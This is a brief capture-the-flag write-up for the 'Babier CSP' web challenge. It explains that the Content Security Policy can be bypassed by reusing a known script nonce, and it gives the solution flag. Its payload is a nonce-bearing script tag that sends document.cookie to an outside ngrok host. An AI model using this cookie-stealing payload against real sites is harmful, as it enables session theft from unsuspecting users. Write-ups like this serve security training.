Babier CSP
===
**Category**: Web

**Points**: 107 (349 solves)

**Author**: notdeghost
### Description
- ```Baby CSP was too hard for us, try Babier CSP.```
- Site: `babier-csp.dicec.tf`
- Source `index.js`

### Solution
- we need fake nonce because csp load script from nonce
### Payload 
```<script nonce=LRGWAXOY98Es0zz0QOVmag==>document.location="http://9127bf181722.ngrok.io/?a"+document.cookie;</script>```
### Get flag
`https://babier-csp.dicec.tf/4b36b1b8e47f761263796b1defd80745/`
### Flag
- `dice{web_1s_a_stat3_0f_grac3_857720}`
